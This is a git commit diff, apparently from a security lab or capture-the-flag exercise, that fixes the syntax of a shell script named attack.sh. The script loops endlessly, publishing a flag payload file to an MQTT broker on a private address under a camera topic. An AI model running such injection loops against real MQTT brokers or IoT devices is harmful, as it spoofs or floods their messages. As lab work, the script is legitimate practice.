b32d6f016d1cb605872c688854b5c37854f2147e
r00tpl4nt3r <urregdie@b-tu.de>
2025-06-15 13:29:39 +0200

    done

--- security/case5/attack.sh
+++ security/case5/attack.sh
@@ -2,18 +2,20 @@
 #do in an endless loop
 while true; do
   #publish the payload to the MQTT broker
-  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1
+  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1;
   #wait 1 second
-  sleep 1
-  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1
+  sleep 1;
+  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1;
   #wait 1 second
-  sleep 1
-  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1
+  sleep 1;
+  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1;
   #wait 1 second
-  sleep 1
-  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1
+  sleep 1;
+  mosquitto_pub -h 192.168.183.7  -t "i/cam" -f ./mqtt.payload.flag1;
   #wait 1 second
-  sleep 1
+  sleep 1;
+
+  done
 
 
 
